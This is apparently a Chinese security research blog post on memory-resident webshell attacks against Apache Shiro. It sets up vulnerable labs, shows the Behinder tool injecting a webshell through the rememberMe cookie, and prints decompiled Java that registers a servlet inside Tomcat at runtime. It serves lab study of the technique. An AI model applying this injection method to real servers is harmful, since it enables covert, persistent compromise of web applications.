---
layout: about
category: about
Researchname:  基于内存的Shiro框架Webshell攻击研究
toc: true
author: Bin4xin
wrench: 2021-11-19
permalink: /about/Research-on-Webshell-Attack-of-Shiro-Framework-Based-on-Memory/
---

# 基于内存的Shiro框架Webshell攻击研究

- ✅Shiro框架部署
    * IDEA tomcat调试部署
    * docker compose
- ✅Shiro框架攻击
    * 手动poc
    * 工具poc
- ✅基于tomcat的通用回显
    * tomcat冰蝎内存马
        * 利用原理
        * 攻击测试
- ✅给👴连！


## 零：Shiro框架部署
现如今部署一个靶场的方法有很多，取决于个人喜好和需求；我结合个人能力做出了一些总结：

{: .table}
| 特点\部署办法 | 1.docker-compose | 2.IDEA tomcat调试部署 | 3.「docker+IDEA」| 
| :--- | :--- | :--- | :--- |
| 快捷程度 | 几条命令快捷部署 | 需开放调试端口+tomcat war包(如无则需源码构建) | 你懂的 | 
| 能否调试 | ❎ | ✅ | ✅ |
| 自定义靶场（如页面） | ❎ | ✅ | ✅ | 

#### # 0x01：IDEA tomcat调试部署
本篇文章会侧重描述如何进行针对IDEA的tomcat调试部署；

- 克隆源码
  * 以shiro-721为例：
    ```
    git clone https://github.com/apache/shiro.git
    cd shiro
    git checkout shiro-root-1.4.1
    mvn install
    cd samples/web
    mvn install
    ```
  * 找到`{path-to-shiro}/samples/web/target`目录下的war包复制到tomcat webapps目录下：
    ```
    $ tree
    target
    ··
    │   ├── index.jsp
    │   ├── login.jsp
    │   ├── logout.jsp
    │   └── style.css
    ├── samples-web-1.4.1.war
    
    $ cp samples/web/target/samples-web-1.4.1.war {path-to-tomcat}/webapps/
    ```
- 开放tomcat调试端口：
    * 找到`bin/catalina.sh`文件中的`JAVA_OPTS`（会有多个），修改如下：
    ```
      JAVA_OPTS="$JAVA_OPTS $JSSE_OPTS"
      
      # Register custom URL handlers
      # Do this here so custom URL handles (specifically 'war:...') can be used in the security policy
      JAVA_OPTS="$JAVA_OPTS -Djava.protocol.handler.pkgs=org.apache.catalina.webresources"
      CATALINA_OPTS="-Xdebug -Xrunjdwp:transport=dt_socket,address=5555,suspend=n,server=y"
      #上面的CATALINA_OPTS为新增；address为调试端口，可自行更改。
    ```
    * `bin/startup.sh`启动，看到以下日志打印则开放调试成功：
    ```
      $ tail -f logs/catalina.out
      Listening for transport dt_socket at address: 5555
      10-Mar-2021 09:51:16.763 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log Server.服务器版本: Apache Tomcat/8.5.57
      ···
      10-Mar-2021 09:51:16.769 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 命令行参数：-Xdebug
      10-Mar-2021 09:51:16.769 信息 [main] org.apache.catalina.startup.VersionLoggerListener.log 命令行参数：-Xrunjdwp:transport=dt_socket,address=5555,suspend=n,server=y
    ```
- IDEA+tomcat调试：
    * IDEA配置（添加server时为`Tomcat Server`->`Remote`）：
    ![idea-tomcat-conf.png](https://i.loli.net/2021/11/18/lzFJ2uNZPagBfn6.png)
    * 如下图，加上`home.jsp`断点后进行http请求，可以看到IDEA中返回的frames详情；
    ![remote-debug-pic.png](https://i.loli.net/2021/11/18/6WGlumFBdDwstVY.png)
    
这样基本上一个基本的IDEA+tomcat的调试配置过程基本就完成了，当然，这只是调试前的准备工作，大家多练习几次，基本上就能够熟练掌握；而最重要的以及最难的其实是调试阶段，
调试过程中的一些技巧和能力是在一次次的实践中沉淀下来的，在这里仅仅当作抛砖引玉，不做赘述。

#### # 0x02：docker compose部署

- 准备工作
    * 根据不同操作系统下载安装docker；
    * 安装`python->pip->docker-compose`，教程自行搜索:)
- 下载靶场
    * vulhub based on docker：
    ```
      $ git clone https://github.com/vulhub/vulhub.git
      $ cd vulhub/shiro/CVE-2016-4437/
      $ docker-compose up -d
    ```
等待启动即可。

## 一：Shiro框架攻击
poc代码生成攻击cookie可以参考之前的文章：
#### 1x01：手动poc
[分享：Different Shiro Framework deserialization analysis ideas#how to poc](/about/ShiroDeser/#2x03how-to-poc){:target="_blank"}
#### 1x02：工具poc
[分享：Different Shiro Framework deserialization analysis ideas#验证](/about/ShiroDeser/#%E4%BA%8C%E9%AA%8C%E8%AF%81){:target="_blank"}

## 二：基于tomcat的通用回显之冰蝎内存马
这一小节由于个人水平有限，不能像各位师傅一样从tomcat servlet等层面一探究竟，我尽量使用简洁的语言写出我的理解；
#### # 2x01：攻击测试
工具直接选择"冰蝎2_Tomcat"，执行注入；
- http发包请求如下：
![behinder-post-request.png](https://i.loli.net/2021/11/18/tUJATRsNyZQFWX4.png)
我们可以看到HTTP请求为POST请求`p`&`path`&`dy`数据；同时header中加入了`rememberMe Cookie`；

- 分析：
Cookie是作为反序列化的入口，`dy`参数应该是写入内存的命令

同时最后返回`dynamic inject success`；

- 注入成功效果：
![webshell-mem-display.png](https://i.loli.net/2021/11/18/jKPIn8YHdTsW9LS.png)

#### # 2x02：利用原理
我们把利用工具的jar包扔进反编译软件定位到`BehOldDemoServlert.class`，我们来看看代码是怎么工作的：
```java
  public void dynamicAddServlet(ServletContext servletContext) throws Exception {
    Method method;
    String wrapperName = this.path;
    ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade)servletContext;
    Field applicationContextField = applicationContextFacade.getClass().getDeclaredField("context");
    applicationContextField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext)applicationContextField.get(applicationContextFacade);
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext)standardContextField.get(applicationContext);
    Object newWrapper = invoke(standardContext, "createWrapper", (Object[])null);
    invoke(newWrapper, "setName", new Object[] { wrapperName });
    setFieldValue(newWrapper, "instance", this);
    Class<?> containerClass = Class.forName("org.apache.catalina.Container", false, standardContext.getClass().getClassLoader());
    Object oldWrapper = invoke(standardContext, "findChild", new Object[] { wrapperName });
    if (oldWrapper != null)
      standardContext.getClass().getDeclaredMethod("removeChild", new Class[] { containerClass }); 
    standardContext.getClass().getDeclaredMethod("addChild", new Class[] { containerClass }).invoke(standardContext, new Object[] { newWrapper });
    try {
      method = standardContext.getClass().getMethod("addServletMappingDecoded", new Class[] { String.class, String.class });
    } catch (Exception var9) {
      method = standardContext.getClass().getMethod("addServletMapping", new Class[] { String.class, String.class });
    } 
    method.invoke(standardContext, new Object[] { this.path, wrapperName });
    init((ServletConfig)getFieldValue(newWrapper, "facade"));
  }
```
